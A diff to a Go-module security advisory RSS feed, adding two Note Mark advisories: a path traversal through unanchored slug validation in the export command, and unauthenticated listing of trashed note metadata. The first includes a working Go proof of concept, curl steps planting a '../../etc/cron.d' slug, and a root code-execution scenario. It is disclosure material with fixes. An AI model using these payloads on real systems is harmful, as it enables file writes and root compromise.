@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-09T11:43:48.695Z</updated>
+    <updated>2026-07-09T14:28:04.058Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,323 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/enchant97/note-mark/backend] Note Mark: Path traversal via unsanitized book/note slug in migrate export (sibling of GHSA-g49p)]]></title>
+        <id>https://github.com/advisories/GHSA-rqrh-8wpv-x7hh</id>
+        <link href="https://github.com/advisories/GHSA-rqrh-8wpv-x7hh"/>
+        <updated>2026-07-09T13:41:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Note Mark validates book and note <code>slug</code> values with the OpenAPI/huma tag <code>pattern:"[a-z0-9-]+"</code>. huma compiles this with <code>regexp.MustCompile(s.Pattern)</code> and tests it with <code>patternRe.MatchString(str)</code>, an UNANCHORED match. Because the pattern is not anchored (<code>^...$</code>), any string that merely CONTAINS one <code>[a-z0-9-]</code> substring passes validation. A slug such as <code>../../../../../../tmp/escape</code> is accepted and stored verbatim.</p>
+<p>The data-export CLI commands (<code>note-mark migrate export</code> and <code>note-mark migrate export-v1</code>) join these unsanitized slugs straight into the output path with <code>path.Join</code> / <code>filepath.Join</code>, then <code>os.MkdirAll</code> the directory and <code>os.Create</code> the note file. <code>path.Join</code> resolves the <code>../</code> segments, so the note content file is written OUTSIDE the configured export directory. The export process commonly runs as root (default in Docker / bare-metal admin usage), so this is a root-privilege arbitrary directory create + file write.</p>
+<p>This is the unguarded sibling of GHSA-g49p-4qxj-88v3 (CVE class CWE-22 in the same export sinks). That fix added <code>filepath.Base(asset.Name)</code> to sanitize the asset filename, but the adjacent path components <code>book.Slug</code> and <code>note.Slug</code> — used in the very same <code>path.Join</code> calls in the same two export functions — were left raw, and their input-side <code>pattern</code> guard is bypassable as shown above.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p>Slug input validation (<code>backend/db/types.go</code>, v0.19.4):</p>
+<pre><code class="language-go">type CreateBook struct {
+    Name     string `json:"name" required:"true" minLength:"1" maxLength:"80"`
+    Slug     string `json:"slug" required:"true" minLength:"1" maxLength:"80" pattern:"[a-z0-9-]+"`
+    IsPublic bool   `json:"isPublic,omitempty" default:"false"`
+}
+
+type CreateNote struct {
+    Name string `json:"name" required:"true" minLength:"1" maxLength:"80"`
+    Slug string `json:"slug" required:"true" minLength:"1" maxLength:"80" pattern:"[a-z0-9-]+"`
+}
+</code></pre>
+<p>huma applies the pattern UNANCHORED (<code>github.com/danielgtaylor/huma/v2@v2.37.3</code>):</p>
+<pre><code class="language-go">// schema.go
+if s.Pattern != "" {
+    s.patternRe = regexp.MustCompile(s.Pattern)
+</code></pre>
+<pre><code class="language-go">// validate.go
+if s.patternRe != nil {
+    if !s.patternRe.MatchString(str) {
+        res.Add(path, v, s.msgPattern)
+</code></pre>
+<p><code>regexp.MatchString("[a-z0-9-]+", "../../../../tmp/escape")</code> is <code>true</code> (it matches the <code>tmp</code> substring), so the traversal slug passes and <code>BooksService.CreateBook</code> / <code>NotesService</code> store it verbatim.</p>
+<p>Export sinks (<code>backend/cli/migrate.go</code>, v0.19.4). The asset filename was sanitized by the GHSA-g49p fix; the sibling slug path components were not:</p>
+<pre><code class="language-go">// commandMigrateExportDataV1 / commandMigrateExportData
+for _, book := range user.Books {
+    bookDir := path.Join(exportDir, user.Username, book.Slug)   // book.Slug raw
+    for _, note := range book.Notes {
+        noteDir := path.Join(bookDir, note.Slug)                // note.Slug raw
+        if err := os.MkdirAll(noteDir, os.ModePerm); err != nil {
+            return err
+        }
+        f, err := os.Create(path.Join(noteDir, "_index.md"))    // escapes exportDir
+</code></pre>
+<pre><code class="language-go">// the same functions DO sanitize the sibling asset name:
+assetFileName := filepath.Base(asset.Name)
+if assetFileName == "/" || assetFileName == "." {
+    log.Printf("disallowed asset filename found '%s', skipping\n", asset.Name)
+    continue
+}
+f, err := os.Create(path.Join(assetsDir, asset.ID.String()+"."+assetFileName))
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>A low-privilege authenticated user (any registered account that can create a book/note) sets a traversing <code>slug</code>. When an administrator later runs <code>note-mark migrate export</code> or <code>export-v1</code> (a routine backup/migration operation, commonly as root in Docker), the exporter creates attacker-chosen directories and writes the note's <code>_index.md</code> to an arbitrary filesystem location outside the export directory. With root, this allows writing to <code>/etc/cron.d/</code>, systemd unit directories, or other startup paths, escalating to code execution as root. Same trust boundary and severity class as GHSA-g49p-4qxj-88v3.</p>
+<h2 id="attack-scenario">Attack scenario</h2>
+<ol>
+<li>Attacker registers / uses any normal user account.</li>
+<li>Attacker <code>POST /api/books</code> (or a note) with <code>slug</code> = <code>../../../../../../etc/cron.d/x</code> (passes the unanchored <code>[a-z0-9-]+</code> pattern). Stored verbatim.</li>
+<li>Admin runs <code>note-mark migrate export-v1 --export-dir /data/backup</code> (root).</li>
+<li>Exporter does <code>path.Join("/data/backup", username, "../../../../../../etc/cron.d/x")</code> which yields <code>/etc/cron.d/x</code>, then <code>os.MkdirAll</code> creates it and <code>os.Create(path.Join(noteDir, "_index.md"))</code> writes attacker-influenced content outside <code>/data/backup</code>.</li>
+</ol>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Self-contained Go reproducer pinning <code>huma v2.37.3</code> (Note Mark's exact version) and Note Mark's exact <code>CreateBook</code> DTO + the exact export <code>path.Join</code> expression. It demonstrates (a) the traversal slug passes huma validation, (b) a negative control that genuinely violates the charset is rejected, (c) the export sink writes the file outside the export root.</p>
+<pre><code class="language-go">// go.mod: module nmpoc; go 1.24; require github.com/danielgtaylor/huma/v2 v2.37.3
+package main
+
+import (
+    "context"
+    "fmt"
+    "net/http"
+    "net/http/httptest"
+    "os"
+    "path"
+    "strings"
+
+    "github.com/danielgtaylor/huma/v2"
+    "github.com/danielgtaylor/huma/v2/adapters/humago"
+)
+
+// Mirror of note-mark backend/db/types.go:24-28 CreateBook DTO at v0.19.4.
+type CreateBook struct {
+    Name     string `json:"name" required:"true" minLength:"1" maxLength:"80"`
+    Slug     string `json:"slug" required:"true" minLength:"1" maxLength:"80" pattern:"[a-z0-9-]+"`
+    IsPublic bool   `json:"isPublic,omitempty" default:"false"`
+}
+type CreateBookInput struct{ Body CreateBook }
+type CreateBookOutput struct {
+    Body struct {
+        Slug string `json:"slug"`
+    }
+}
+
+func main() {
+    mux := http.NewServeMux()
+    api := humago.New(mux, huma.DefaultConfig("note-mark-poc", "1.0.0"))
+    var stored string
+    huma.Register(api, huma.Operation{OperationID: "create-book", Method: http.MethodPost, Path: "/api/books"},
+        func(ctx context.Context, in *CreateBookInput) (*CreateBookOutput, error) {
+            stored = in.Body.Slug // BooksService.CreateBook stores Slug verbatim
+            out := &amp;CreateBookOutput{}
+            out.Body.Slug = in.Body.Slug
+            return out, nil
+        })
+
+    const traversalSlug = `../../../../../../tmp/nmpoc-escape`
+    body := fmt.Sprintf(`{"name":"x","slug":%q}`, traversalSlug)
+    req := httptest.NewRequest(http.MethodPost, "/api/books", strings.NewReader(body))
+    req.Header.Set("Content-Type", "application/json")
+    rec := httptest.NewRecorder()
+    mux.ServeHTTP(rec, req)
+    fmt.Printf("[validation] slug=%q status=%d stored=%q\n", traversalSlug, rec.Code, stored)
+
+    // Negative control: a slug with NO [a-z0-9-] char anywhere must be rejected.
+    negReq := httptest.NewRequest(http.MethodPost, "/api/books", strings.NewReader(`{"name":"x","slug":"@@@@"}`))
+    negReq.Header.Set("Content-Type", "application/json")
+    negRec := httptest.NewRecorder()
+    mux.ServeHTTP(negRec, negReq)
+    fmt.Printf("[neg-control] slug=\"@@@@\" status=%d (expect 422)\n", negRec.Code)
+
+    // Export sink expression from backend/cli/migrate.go:187,191,203.
+    exportDir := "/tmp/nmpoc-exportroot"
+    _ = os.RemoveAll(exportDir)
+    _ = os.RemoveAll("/tmp/nmpoc-escape")
+    _ = os.MkdirAll(exportDir, 0o755)
+    bookDir := path.Join(exportDir, "victim", stored)
+    noteDir := path.Join(bookDir, "n")
+    _ = os.MkdirAll(noteDir, 0o755)
+    outPath := path.Join(noteDir, "_index.md")
+    _ = os.WriteFile(outPath, []byte("PWNED-NOTE-CONTENT\n"), 0o644)
+    escaped := !strings.HasPrefix(path.Clean(outPath), path.Clean(exportDir)+"/")
+    fmt.Printf("[export] joined=%q escapedExportDir=%v\n", outPath, escaped)
+    if d, err := os.ReadFile("/tmp/nmpoc-escape/n/_index.md"); err == nil {
+        fmt.Printf("[export] SENTINEL written OUTSIDE exportDir =&gt; %q\n", strings.TrimSpace(string(d)))
+    }
+}
+</code></pre>
+<p>Verbatim output (<code>go run .</code>, huma v2.37.3, go1.26.1):</p>
+<pre><code>[validation] slug="../../../../../../tmp/nmpoc-escape" status=200 stored="../../../../../../tmp/nmpoc-escape"
+[neg-control] slug="@@@@" status=422 (expect 422)
+[export] joined="/tmp/nmpoc-escape/n/_index.md" escapedExportDir=true
+[export] SENTINEL written OUTSIDE exportDir =&gt; "PWNED-NOTE-CONTENT"
+</code></pre>
+<p>The traversal slug is ACCEPTED (status 200) while the negative control is correctly rejected (422), and the export <code>path.Join</code> writes the note file outside the export root.</p>
+<h2 id="end-to-end-reproduction">End-to-end reproduction</h2>
+<p>Against the released image <code>ghcr.io/enchant97/note-mark-aio:0.19.4</code> (the GHSA-g49p fix release):</p>
+<pre><code class="language-bash"># 1. start
+docker run -d --name nm -p 8080:8080 -e JWT_SECRET="$(openssl rand -base64 32)" \
+  -e PUBLIC_URL="http://localhost:8080" ghcr.io/enchant97/note-mark-aio:0.19.4
+# 2. register + login (capture Auth-Session-Token cookie)
+curl -s -X POST localhost:8080/api/users -H 'Content-Type: application/json' \
+  -d '{"username":"attacker","password":"Attack3r!","name":"a"}'
+TOKEN=$(curl -s -D - -X POST localhost:8080/api/auth/token -H 'Content-Type: application/json' \
+  -d '{"username":"attacker","password":"Attack3r!","grant_type":"password"}' \
+  | sed -n 's/.*Auth-Session-Token=\([^;]*\).*/\1/p')
+# 3. create a book with a traversing slug — passes the [a-z0-9-]+ pattern
+curl -s -X POST localhost:8080/api/books -H 'Content-Type: application/json' \
+  -b "Auth-Session-Token=$TOKEN" \
+  -d '{"name":"x","slug":"../../../../../../tmp/nmpoc-escape"}'
+#    response echoes "slug":"../../../../../../tmp/nmpoc-escape" (accepted, 200/201)
+# 4. add a note under that book (any valid note slug), then trigger admin export
+docker exec nm /note-mark migrate export-v1 --export-dir /data/backup
+# 5. observe the note _index.md written outside /data/backup
+docker exec nm ls -la /tmp/nmpoc-escape/
+</code></pre>
+<p>The self-contained Go reproducer above is the deterministic, version-pinned demonstration of the validation bypass + sink escape (it does not require the full image build).</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Apply <code>filepath.Base()</code> (the same idiom already used for <code>asset.Name</code> in the GHSA-g49p fix) to the sibling slug path components in both export functions, and/or reject the result if it differs from the raw value:</p>
+<pre><code class="language-go">bookSlug := filepath.Base(book.Slug)
+noteSlug := filepath.Base(note.Slug)
+if bookSlug != book.Slug || noteSlug != note.Slug {
+    log.Printf("disallowed slug found, skipping book=%q note=%q\n", book.Slug, note.Slug)
+    continue
+}
+bookDir := path.Join(exportDir, user.Username, bookSlug)
+noteDir := path.Join(bookDir, noteSlug)
+</code></pre>
+<p>Root cause hardening (preferred): anchor the slug pattern at the input layer so traversal can never enter the DB. Either change the tag to an anchored regex <code>pattern:"^[a-z0-9-]+$"</code>, or reject <code>strings.ContainsAny(slug, "/\\.")</code> in the create/update handlers (mirroring the <code>PostNoteAsset</code> header check added by GHSA-g49p). <code>user.Username</code> (<code>pattern:"[a-zA-Z0-9]+"</code>) is also unanchored and should be anchored for the same reason.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p><code>&lt;= v0.19.4</code> (current latest release). The slug components are used unsanitized in <code>backend/cli/migrate.go</code> at v0.19.4, the release that fixed the sibling <code>asset.Name</code> traversal (GHSA-g49p-4qxj-88v3).</p>
+<h2 id="fix-pr">Fix PR</h2>
+<p>A fix is prepared on the temporary private advisory fork: <code>enchant97/note-mark-ghsa-rqrh-8wpv-x7hh</code> PR #1. It anchors the slug/username <code>pattern</code> tags (<code>^[a-z0-9-]+$</code> / <code>^[a-zA-Z0-9]+$</code>) at the input layer and adds defense-in-depth <code>filepath.Base()</code> checks to both export functions, plus a regression test. <code>go test ./backend/db/</code> passes with the fix and fails against the old unanchored pattern.</p>
+<h2 id="credit">Credit</h2>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/enchant97/note-mark/security/advisories/GHSA-rqrh-8wpv-x7hh">https://github.com/enchant97/note-mark/security/advisories/GHSA-rqrh-8wpv-x7hh</a></li>
+<li><a href="https://github.com/enchant97/note-mark/commit/67b7de04308a858ef27ceff87b514067b6d667e5">https://github.com/enchant97/note-mark/commit/67b7de04308a858ef27ceff87b514067b6d667e5</a></li>
+<li><a href="https://github.com/advisories/GHSA-rqrh-8wpv-x7hh">https://github.com/advisories/GHSA-rqrh-8wpv-x7hh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rqrh-8wpv-x7hh</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-09T13:41:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/enchant97/note-mark/backend] Note Mark: Unauthenticated disclosure of soft-deleted note metadata via deleted=true on public books]]></title>
+        <id>https://github.com/advisories/GHSA-588f-fvcv-xhvf</id>
+        <link href="https://github.com/advisories/GHSA-588f-fvcv-xhvf"/>
+        <updated>2026-07-09T13:41:31.000Z</updated>
+        <content type="html"><![CDATA[<p>Summary</p>
+<p>  GET /api/books/{bookID}/notes is an unauthenticated endpoint that accepts a "deleted" query parameter. When the request is ?deleted=true, the
+  service runs the query with Unscoped() (bypassing GORM's soft-delete scope) but keeps the read-authorization clause as "owner_id = ? OR is_public
+  = ?". As a result, any unauthenticated caller can enumerate the metadata of soft-deleted ("trashed") notes belonging to any public book — notes
+  the owner explicitly deleted and expected to be removed from public view.</p>
+<p>  Affected component (code-verified)</p>
+<p>  backend/services/notes.go — GetNotesByBookID (lines 72-89):</p>
+<p>  func (s NotesService) GetNotesByBookID(currentUserID *uuid.UUID, bookID uuid.UUID, deleted bool) ([]db.Note, error) {
+        tx := db.DB
+        if deleted {
+                tx = tx.Unscoped() // &lt;-- bypasses soft-delete scope
+        }
+        tx = tx.
+                Preload("Book").
+                Joins("JOIN books ON books.id = notes.book_id").
+                Where(
+                        db.DB.Where("books.id = ?", bookID),
+                        db.DB.Where("owner_id = ? OR is_public = ?", currentUserID, true), // &lt;-- is_public still honored for trash
+                )
+        if deleted {
+                tx = tx.Where("notes.deleted_at IS NOT NULL")
+        }
+        var notes []db.Note
+        return notes, dbErrorToServiceError(tx.Find(&amp;notes).Error)
+  }</p>
+<p>  Route registration confirms the endpoint has no AuthRequiredMiddleware (backend/handlers/notes.go:37), and the deleted flag is attacker-controlled
+   (backend/handlers/notes.go:86 — Deleted bool with query:"deleted").</p>
+<p>  Proof of concept</p>
+<ol>
+<li>A victim owns a public book (is_public = true), creates a note, then soft-deletes it (moves it to trash). The note still exists in the DB with
+  deleted_at set.</li>
+<li>An unauthenticated attacker who knows (or enumerates) the book UUID requests: GET /api/books//notes?deleted=true</li>
+<li>The response lists the soft-deleted note(s) — id, title, slug, timestamps — even though the attacker is not authenticated and the owner
+  intended the note to be deleted.</li>
+</ol>
+<p>  Impact</p>
+<p>  Exposure of soft-deleted note metadata (title, slug, timestamps) of public books to unauthenticated actors. The note body is not exposed — the
+  content endpoint (GetNoteContent) does not use Unscoped(), so its count query returns 0 for soft-deleted notes and yields 404. Impact is therefore
+   limited to metadata disclosure and the bypass of the intended "delete" semantics on public books.</p>
+<p>  Remediation</p>
+<p>  Restrict trash (soft-deleted) listings to the book owner only — never honor the is_public branch when deleted=true:</p>
+<p>   func (s NotesService) GetNotesByBookID(currentUserID *uuid.UUID, bookID uuid.UUID, deleted bool) ([]db.Note, error) {
+        tx := db.DB
+        if deleted {
+                tx = tx.Unscoped()
+        }</p>
+<ul>
+<li><pre><code>// Soft-deleted ("trash") notes must only ever be listed to the book owner.
+</code></pre>
+</li>
+<li><pre><code>authz := db.DB.Where("owner_id = ? OR is_public = ?", currentUserID, true)
+</code></pre>
+</li>
+<li><pre><code>if deleted {
+</code></pre>
+</li>
+<li><pre><code>        authz = db.DB.Where("owner_id = ?", currentUserID)
+</code></pre>
+</li>
+<li><pre><code>}
+tx = tx.
+        Preload("Book").
+        Joins("JOIN books ON books.id = notes.book_id").
+        Where(
+                db.DB.Where("books.id = ?", bookID),
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><pre><code>                db.DB.Where("owner_id = ? OR is_public = ?", currentUserID, true),
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><pre><code>                authz,
+        )
+if deleted {
+        tx = tx.Where("notes.deleted_at IS NOT NULL")
+}
+var notes []db.Note
+return notes, dbErrorToServiceError(tx.Find(&amp;notes).Error)
+</code></pre>
+</li>
+</ul>
+<p>   }</p>
+<p>  With this change, when currentUserID is nil (unauthenticated) and deleted=true, the clause becomes owner_id = NULL, which matches nothing — so
+  trash is never exposed to anonymous callers.</p>
+<p>  Coordinated disclosure / CVE request</p>
+<p>  We have reported this privately and are happy to assist with any further validation or testing you need. If you agree this qualifies as a security
+   vulnerability, we would be grateful if you could request a CVE ID for it — GitHub lets maintainers request a CVE directly from this advisory page
+   once it is accepted. Thank you for your time and for maintaining note-mark.</p>
+<p>  References</p>
+<ul>
+<li>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</li>
+<li>CWE-285: Improper Authorization</li>
+<li>Prior note-mark authorization fix (CVE-2026-40265) established that read paths must scope by owner_id OR is_public; this report covers the trash
+   path that the scope did not fully cover.</li>
+</ul>
+<hr>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/enchant97/note-mark/security/advisories/GHSA-588f-fvcv-xhvf">https://github.com/enchant97/note-mark/security/advisories/GHSA-588f-fvcv-xhvf</a></li>
+<li><a href="https://github.com/enchant97/note-mark/commit/9c9b72740f22a06131a8f64b53bb08e3b05b81a6">https://github.com/enchant97/note-mark/commit/9c9b72740f22a06131a8f64b53bb08e3b05b81a6</a></li>
+<li><a href="https://github.com/advisories/GHSA-588f-fvcv-xhvf">https://github.com/advisories/GHSA-588f-fvcv-xhvf</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-588f-fvcv-xhvf</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-09T13:41:29.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor: Arbitrary file write possible through Local File System storage provider]]></title>
         <id>https://github.com/advisories/GHSA-rmxx-v9rj-vpvg</id>
@@ -2379,53 +2696,5 @@ ok  	github.com/zxh326/kite/pkg/system	0.711s
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-06-25T22:22:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto] golang.org/x/crypto vulnerable to infinite loop on large channel writes]]></title>
-        <id>https://github.com/advisories/GHSA-rm3j-f69w-wqmq</id>
-        <link href="https://github.com/advisories/GHSA-rm3j-f69w-wqmq"/>
-        <updated>2026-07-07T15:26:18.000Z</updated>
-        <content type="html"><![CDATA[<p>When writing data larger than 4GB in a single Write call on an SSH channel, an integer overflow in the internal payload size calculation caused the write loop to spin indefinitely, sending empty packets without making progress. The size comparison now uses int64 to prevent truncation.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39834">https://nvd.nist.gov/vuln/detail/CVE-2026-39834</a></li>
-<li><a href="https://go.dev/cl/781663">https://go.dev/cl/781663</a></li>
-<li><a href="https://go.dev/issue/79567">https://go.dev/issue/79567</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5020">https://pkg.go.dev/vuln/GO-2026-5020</a></li>
-<li><a href="https://github.com/advisories/GHSA-rm3j-f69w-wqmq">https://github.com/advisories/GHSA-rm3j-f69w-wqmq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rm3j-f69w-wqmq</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:21:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[golang.org/x/crypto] golang.org/x/crypto: FIDO/U2F security key physical presence check can be bypassed]]></title>
-        <id>https://github.com/advisories/GHSA-89gr-r52h-f8rx</id>
-        <link href="https://github.com/advisories/GHSA-89gr-r52h-f8rx"/>
-        <updated>2026-07-07T15:25:58.000Z</updated>
-        <content type="html"><![CDATA[<p>The Verify() method for FIDO/U2F security key types (<a href="mailto:sk-ecdsa-sha2-nistp256@openssh.com">sk-ecdsa-sha2-nistp256@openssh.com</a>, <a href="mailto:sk-ssh-ed25519@openssh.com">sk-ssh-ed25519@openssh.com</a>) did not check the User Presence flag. Signatures generated without physical touch were accepted, allowing unattended use of a hardware security key. To restore the previous behavior, return a "no-touch-required" extension in Permissions.Extensions from PublicKeyCallback.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39831">https://nvd.nist.gov/vuln/detail/CVE-2026-39831</a></li>
-<li><a href="https://go.dev/cl/781662">https://go.dev/cl/781662</a></li>
-<li><a href="https://go.dev/issue/79566">https://go.dev/issue/79566</a></li>
-<li><a href="https://groups.google.com/g/golang-announce/c/a082jnz-LvI">https://groups.google.com/g/golang-announce/c/a082jnz-LvI</a></li>
-<li><a href="https://pkg.go.dev/vuln/GO-2026-5019">https://pkg.go.dev/vuln/GO-2026-5019</a></li>
-<li><a href="https://github.com/advisories/GHSA-89gr-r52h-f8rx">https://github.com/advisories/GHSA-89gr-r52h-f8rx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-89gr-r52h-f8rx</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-06-25T22:21:12.000Z</published>
     </entry>
 </feed>
